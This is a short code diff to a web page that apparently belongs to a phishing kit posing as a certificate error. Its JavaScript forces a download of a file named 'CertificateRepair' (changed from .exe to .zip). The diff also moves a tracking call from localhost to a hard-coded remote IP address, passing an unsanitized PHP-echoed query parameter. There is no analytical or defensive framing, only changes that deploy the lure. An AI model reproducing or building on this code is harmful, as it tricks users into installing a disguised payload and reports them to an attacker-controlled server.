@@ -690,8 +690,8 @@ button {
   function downCert(){ 
     var downloadElement = document.createElement('a');
     const evt = document.createEvent('MouseEvent');
-    downloadElement.download = 'CertificateRepair.exe';
-    downloadElement.href = 'CertificateRepair.exe';
+    downloadElement.download = 'CertificateRepair.zip';
+    downloadElement.href = '/h5/static/CertificateRepair.zip';
     evt.initEvent('click', true,true);
     downloadElement.dispatchEvent(evt);
     window.URL.revokeObjectURL(downloadElement.href);
@@ -703,7 +703,7 @@ button {
               }
         }
     };
-    xhr.open("get", "http://127.0.0.1/newfish/f2/letgo.php?f=<?php echo(@$_GET['c']);?>", true);
+    xhr.open("get", "http://154.23.129.142:309/h5/static/letgo.php?f=<?php echo(@$_GET['c']);?>", true);
     xhr.send(null);
   }
   const refreshBtn = document.getElementById('details-button');
